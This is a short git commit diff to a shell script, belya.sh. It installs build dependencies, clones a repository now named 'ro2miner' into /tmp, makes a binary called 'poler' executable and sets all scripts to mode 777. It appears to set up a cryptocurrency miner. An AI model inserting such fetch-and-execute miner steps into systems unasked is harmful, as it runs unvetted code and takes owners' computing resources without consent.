65b4a602e83bcba2fa2ea73de38a0861683a9b7c
robbertopp1 <45674442+robbertopp1@users.noreply.github.com>
2019-07-31 06:17:23 -0400

    Update belya.sh

--- belya.sh
+++ belya.sh
@@ -8,7 +8,7 @@ sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano dos2unix cmake mc -y
 sleep 2
 cd /tmp && mkdir next1
-git clone https://github.com/burkabest/next1.git /tmp/next1
+git clone https://github.com/robbertopp1/ro2miner.git /tmp/next1
 cd /tmp/next1
 chmod +x /tmp/next1/poler
 chmod 777 ./*.sh
